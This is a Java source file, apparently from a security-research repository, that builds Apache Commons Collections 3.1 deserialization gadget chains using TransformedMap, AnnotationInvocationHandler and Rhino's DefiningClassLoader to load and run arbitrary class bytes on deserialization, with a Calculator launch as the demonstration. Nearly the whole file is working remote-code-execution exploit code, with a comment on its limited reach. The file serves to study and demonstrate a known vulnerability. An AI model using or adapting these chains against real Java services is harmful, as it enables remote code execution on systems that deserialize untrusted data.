package com.threedr3am.bug.collections.v3.no2;

import com.threedr3am.bug.common.utils.FileToByteArrayUtil;
import com.threedr3am.bug.common.utils.SerializeUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.mozilla.javascript.DefiningClassLoader;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

/**
 * 此处基于Collections3.1中的TransformedMap利用漏洞，并进一步利用defineCLass构造回显,回显利用异常抛出带回，
 * 但由于DefiningClassLoader类所属jar包使用范围有限，而且AnnotationInvocationHandler的利用也仅限jdk1.8以下， 使得这样的利用链可用性不高。
 *
 * Created by threedr3am on 2018/5/4.
 */
public class SerializeMapForTransformer {

  public static void main(String[] args) throws Throwable {
    //测试执行exec方法触发远程指令
//    testCallbackRuntime();
    //测试反序列化加载class时执行exec方法触发远程指令
//    testAnnotationInvocationHandlerForDefineClass();

    //测试加载class时触发远程指令
//    testCallbackRuntime2();
    //测试反序列化加载class时触发远程指令
    testStaticClassInitForDefineClass();

  }

  private static void testStaticClassInitForDefineClass() throws Exception {
    Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(DefiningClassLoader.class),
        new InvokerTransformer("getConstructor", new Class[]{Class[].class},
            new Object[]{new Class[0]}),
        new InvokerTransformer("newInstance", new Class[]{Object[].class},
            new Object[]{new Object[0]}),
        new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class},
            new Object[]{"com.threedr3am.bug.collections.v3.no2.CallbackRuntime2",
                FileToByteArrayUtil.readCallbackRuntimeClassBytes(
                    "com/threedr3am/bug/collections/v3/no2/CallbackRuntime2.class")}),
        new InvokerTransformer("newInstance", new Class[]{}, new Object[]{})
    };
    Transformer transformer = new ChainedTransformer(transformers);
    Map inner = new HashMap();
    inner.put("value", "value");
    Map ouputMap = TransformedMap.decorate(inner, null, transformer);
    Constructor<?> ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler")
        .getDeclaredConstructor(Class.class, Map.class);
    ctor.setAccessible(true);
    Object o = ctor.newInstance(Target.class, ouputMap);
    //序列化输出
    byte[] bytes = SerializeUtil.serialize(o);
    //反序列化
    SerializeUtil.deserialize(bytes);
  }

  private static void testAnnotationInvocationHandlerForDefineClass() throws Exception {
    Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(DefiningClassLoader.class),
        new InvokerTransformer("getConstructor", new Class[]{Class[].class},
            new Object[]{new Class[0]}),
        new InvokerTransformer("newInstance", new Class[]{Object[].class},
            new Object[]{new Object[0]}),
        new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class},
            new Object[]{"com.threedr3am.bug.collections.v3.no2.CallbackRuntime",
                FileToByteArrayUtil.readCallbackRuntimeClassBytes(
                    "com/threedr3am/bug/collections/v3/no2/CallbackRuntime.class")}),
        new InvokerTransformer("newInstance", new Class[]{}, new Object[]{}),
        new InvokerTransformer("exec", new Class[]{String.class},
            new Object[]{"/Applications/Calculator.app/Contents/MacOS/Calculator"})
    };
    Transformer transformer = new ChainedTransformer(transformers);
    Map inner = new HashMap();
    inner.put("value", "value");
    Map ouputMap = TransformedMap.decorate(inner, null, transformer);
    Constructor<?> ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler")
        .getDeclaredConstructor(Class.class, Map.class);
    ctor.setAccessible(true);
    Object o = ctor.newInstance(Target.class, ouputMap);
    //序列化输出
    byte[] bytes = SerializeUtil.serialize(o);
    //反序列化
    SerializeUtil.deserialize(bytes);
  }

  private static void testCallbackRuntime() throws Throwable {
    new CallbackRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
  }

  private static void testCallbackRuntime2() throws Throwable {
    new CallbackRuntime2();
  }
}
